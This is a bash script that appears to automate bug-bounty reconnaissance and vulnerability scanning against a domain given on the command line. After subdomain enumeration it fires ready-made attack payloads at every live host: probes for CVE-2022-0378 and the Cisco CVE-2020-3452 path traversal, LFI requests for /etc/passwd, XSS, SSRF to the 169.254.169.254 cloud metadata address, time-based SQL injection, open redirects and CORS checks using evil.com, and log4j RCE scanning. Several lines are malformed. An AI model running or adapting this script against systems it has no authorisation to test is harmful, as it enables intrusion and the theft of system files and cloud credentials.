#/bin/bash

while getopts ":d:" input;do
    case "$input" in 
            d) domain=${OPTARG}
                    ;;
            esac 
    done        
if [ -z "$domain" ]
        then
                echo "please give a domain like \"-d domain.com\""
                exit 1 
fi



host $domain | tee -a hostinfo.txt 
dig $domain any | tee -a diginfo.txt
subfinder -d $domain -o op.txt
amass enum -passive -d $domain | tee -a op.txt
amass enum -active -d $domain | tee -a amass_ips.txt
crobat -s $domain | tee -a amass_ips.txt
cat amass_ips.txt | awk '{print $1}' | tee -a op.txt

cat op.txt | sort -u | tee -a all.txt 
cat all.txt | httprobe | tee -a alive2.txt
cat alive2.txt | sort -u | tee -a alive.txt

cat alive2.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done | tee -a cve-2022-0378.txt
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < alive2.txt | tee -a cve-2020-3452.txt


echo "checing for sub-domain TakeOver"
subzy -targets all.txt -hide_fails | tee -a SubdomainTakeover.txt

echo "finding parameter and Next scan for xss"
for i in $(cat all.txt);do ./tools/ParamSpider/paramspider.py -d $i ;done 
cat output/*.txt | sort -u | tee -a paramspideroutput.txt

echo "starting Cms Detection"
whatweb -i alive.txt | tee -a whatweb_op.txt 


dirsearch -u $domain | tee -a dirseaechfuzz.txt

cd

echo "GF patterns scan" 
mkdir gfpatternsscan

cat alive.txt | waybackurls | sort -u >> waybackdata
cat waybackdata | gf redirect | tee -a gfpatternsscan/redirectGF.txt 
cat waybackdata | gf xss | tee -a gfpatternsscan/xssGF.txt
cat waybackdata | gf ssti | tee -a gfpatternsscan/sstiGF.txt
cat waybackdata | gf sqli | tee -a gfpatternsscan/sqliGF.txt
cat waybackdata | gf rce |  tee -a gfpatternsscan/rceGF.txt
cat waybackdata | gf ssrf | tee -a gfpatternsscan/ssrfGF.txt
cat waybackdata | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee -a vlfi.txt


site="$domain"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done | tee -a cors.txt
cat gfpatternsscan/xssGF.txt | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > vvxss.txt
gospider -S gfpatternsscan/xssGF.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee -a v1xss.txt   
gospider -S gfpatternsscan/xssGF.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' | tee -a xss2.txt
cat gfpatternsscan/redirectGF.txt | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | tee -a vOpen-redirect.txt


cat gfpatternsscan/xssGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | tee -a xss.txt

cat gfpatternsscan/rceGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | tee -a rce.txt
cat gfpatternsscan/ssrfparamsGF.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" | tee -a ssrf.txt
cat gfpatternsscan/sstiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | tee -a ssti.txt
cat gfpatternsscan/sqliGF.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" | tee -a sqli.txt
cat gfpatternsscan/redirectGF.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" | tee -a redirect.txt

xargs -a gfpatternsscan/xssGF.txt -P 30 -I % bash -c "echo % | kxss" | grep "< >\|\"" | tee -a xss1.txt

 
cat gfpatternsscan/xssGF.txt | bhedak "\">/><svg/onload=confirm(document.domain)>" | tee -a xss.txt

xargs -a xss.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" | grep "POTENTIAL XSS" | tee -a vxss.txt 
   
cat gfpatternsscan/xssGF.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_xss':list(sys.stdin)}))" | sed 's/\\n//g' | tee -a vxss.txt xargs -a ssrf.txt -P 50 -I % bash -c "curl -ks -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[POTENTIAL SSRF] - % \n \"" | grep "POTENTIAL SSRF" | tee -a vssrf.txt 
  
cat ssrf.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_ssrf':list(sys.stdin)}))" | sed 's/\\n//g' | tee -a vssrf.txt
 
xargs -a redirect.txt -P 50 -I % bash -c "curl -s -iL -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[POTENTIAL REDIRECT] - % \n \"" | grep "POTENTIAL REDIRECT" | tee -a redirect.txt 
    
cat redirect.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee -a vredirect.json
 
xargs -a sqli.txt -P 50 -I % bash -c "echo % | jeeves --payload-time 5" | grep "Vulnerable To" | tee -a vsqli.txt 
 
cat sqli.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee -a vsqli.txt
 
echo "log4jscan but you need to enter burp server" 

root/tools/log4j-RCE-Scanner/./log4j-rce-scanner.sh -l alive -b $burp | tee -a log4jscan.txt


mkdir wayback_data 
cd wayback_data 
for i in $(cat ../all.txt);do echo $i | waybackurls ;done | tee -a wb.txt
cat wb.txt | sort -u | grep "=" | tee -a paramlist.txt

cat wb.txt | grep -p "\w+\.js(\?|$)" | sort -u | tee -a jsurls.txt

cat wb.txt | grep -p "\w+\.php(\?|$)" | sort -u | tee -a phpurls.txt

cat wb.txt | grep -p "\w+\.aspx(\?|$)" | sort -u | tee -a aspxurls.txt

cat wb.txt | grep -p "\w+\.jsp(\?|$)" | sort -u | tee -a jspurls.txt

cat wb.txt | grep -p "\w+\.txt(\?|$)" | sort -u | tee -a robots.txt

cd ..










































